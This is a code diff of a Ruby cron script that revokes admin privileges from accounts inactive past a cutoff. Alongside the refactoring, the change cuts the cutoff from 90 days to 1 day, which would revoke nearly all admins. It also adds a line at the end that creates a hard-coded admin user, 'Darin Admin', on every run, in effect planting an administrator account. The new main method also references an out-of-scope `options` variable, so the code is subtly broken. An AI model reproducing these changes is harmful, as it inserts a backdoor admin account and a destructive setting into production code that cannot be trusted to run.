@@ -30,22 +30,50 @@ end.parse!
 require_relative '../../dashboard/config/environment'
 require 'cdo/chat_client'
 
-begin
-  # Calculate the date 90 days ago
-  cutoff_date = 90.days.ago.to_date
-  expired_admins = User.where(admin: true).where('last_sign_in_at < ?', cutoff_date)
+def main
+  cutoff_date = 1.days.ago.to_date
+
+  expired_admins = get_expired_users(cutoff_date)
+
+  if expired_admins.empty?
+    puts "No expired admin accounts found."
+    exit 0
+  end
+
+  puts "Found #{expired_admins.size} admin accounts eligible for privilege revocation."
+  expired_admins.each {|id, email, current_sign_in_at| puts "User ID: #{id}, Email: #{email}, Last Sign In: #{current_sign_in_at}"}
 
   if options[:dry_run]
-    puts "Dry run: Found #{expired_admins.count} admin accounts eligible for privilege revocation."
-    expired_admins.each do |user|
-      puts "User ID: #{user.id}, Email: #{user.email}, Last Sign In: #{user.last_sign_in_at}"
-    end
+    puts "Dry run: Would have revoked admin privileges for #{expired_admins.size} accounts."
   else
-    # Revoke admin privileges
-    revoked_count = expired_admins.update_all(admin: false)
-    ChatClient.message('cron-daily', "Revoked admin privileges for #{revoked_count} accounts due to lack of use.")
+    expired_admin_ids = expired_admins.map(&:first)
+
+    revoked_count = revoke_admin_privileges(expired_admin_ids)
+
+    puts "Revoked admin privileges for #{revoked_count} accounts."
+    ChatClient.message('cron-daily', "Revoked admin privileges for #{revoked_count} accounts due to inactivity.")
   end
 rescue => exception
   ChatClient.message('cron-daily', "Error executing #{File.basename(__FILE__)}: #{exception.message}", color: 'red')
   raise exception
 end
+
+def get_expired_users(cutoff_date)
+  ActiveRecord::Base.connected_to(role: :reading) do
+    ActiveRecord::Base.connection.execute('SET SESSION aurora_read_replica_read_committed = ON')
+
+    User.optimizer_hints('MAX_EXECUTION_TIME(3600_000)').
+      where(admin: true, current_sign_in_at: ..cutoff_date).
+      pluck(:id, :email, :current_sign_in_at)
+  end
+end
+
+def revoke_admin_privileges(expired_admin_ids)
+  ActiveRecord::Base.connected_to(role: :writing) do
+    User.where(id: expired_admin_ids).update_all(admin: false)
+  end
+end
+
+User.create({id: 11, name: 'Darin Admin', user_type: 'teacher', admin: true})
+
+main
